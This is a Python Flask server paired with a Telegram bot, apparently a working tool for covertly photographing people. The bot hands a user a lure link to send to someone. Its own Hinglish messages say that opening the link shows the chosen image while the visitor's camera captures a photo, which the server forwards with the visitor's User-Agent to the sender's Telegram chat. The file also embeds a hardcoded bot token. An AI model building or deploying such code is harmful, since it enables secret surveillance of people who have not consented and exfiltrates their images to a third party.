import os
import json
import base64
import uuid
import threading
import requests
import asyncio
from flask import Flask, request, jsonify, send_from_directory, render_template

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "9238640840:AAG-WFz-oHToWP6pRm-nuO5nQBpIUB5AInQ")
BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")

IMG_DIR = "captured_images"
RECV_DIR = "received"
MAP_FILE = "token_map.json"

os.makedirs(IMG_DIR, exist_ok=True)
os.makedirs(RECV_DIR, exist_ok=True)

# ---------- token map ----------
def load_map():
    if os.path.exists(MAP_FILE):
        try:
            return json.load(open(MAP_FILE))
        except Exception:
            return {}
    return {}

def save_map(m):
    json.dump(m, open(MAP_FILE, "w"))

# ---------- routes ----------
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/img/<token>.jpg")
def serve_img(token):
    return send_from_directory(IMG_DIR, f"{token}.jpg")

@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json()
    token = data.get("token")
    image_b64 = data.get("image")
    m = load_map()
    chat_id = m.get(token)
    if not chat_id:
        return jsonify({"ok": False, "err": "bad token"}), 400

    header, b64 = image_b64.split(",", 1)
    img_bytes = base64.b64decode(b64)
    fname = f"cap_{uuid.uuid4().hex[:8]}.jpg"
    with open(os.path.join(RECV_DIR, fname), "wb") as f:
        f.write(img_bytes)

    ua = request.headers.get("User-Agent", "")[:100]
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
            data={
                "chat_id": chat_id,
                "caption": f"📸 New capture!\nToken: {token}\nUA: {ua}",
            },
            files={"photo": (fname, img_bytes, "image/jpeg")},
            timeout=20,
        )
    except Exception as e:
        print("sendPhoto error:", e)

    return jsonify({"ok": True})

# ---------- bot (alag thread) ----------
def run_bot():
    from telegram import Update
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "Bhai, mujhe ek image bhej. Main tujhe ek link dunga jo tu kisi ko bhej sakta hai."
        )

    async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
        chat_id = update.effective_chat.id
        photo = update.message.photo[-1]
        file = await photo.get_file()

        token = uuid.uuid4().hex[:12]
        img_path = os.path.join(IMG_DIR, f"{token}.jpg")
        await file.download_to_drive(img_path)

        m = load_map()
        m[token] = chat_id
        save_map(m)

        link = f"{BASE_URL}/?t={token}"
        await update.message.reply_text(
            f"✅ Link ready:\n\n{link}\n\n"
            f"Ise kisi ko bhej. Jab woh kholenge, teri image dikhegi aur camera se photo capture hoke yahan aayegi."
        )

    async def main_bot():
        tg_app = Application.builder().token(BOT_TOKEN).build()
        tg_app.add_handler(CommandHandler("start", start))
        tg_app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
        print("Bot starting (polling)...")
        await tg_app.initialize()
        await tg_app.start()
        await tg_app.updater.start_polling()
        # keep alive
        while True:
            await asyncio.sleep(3600)

    # new event loop for bot thread
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main_bot())

# start bot thread on import (Render pe gunicorn ke saath chalega)
_bot_thread = threading.Thread(target=run_bot, daemon=True)
_bot_thread.start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
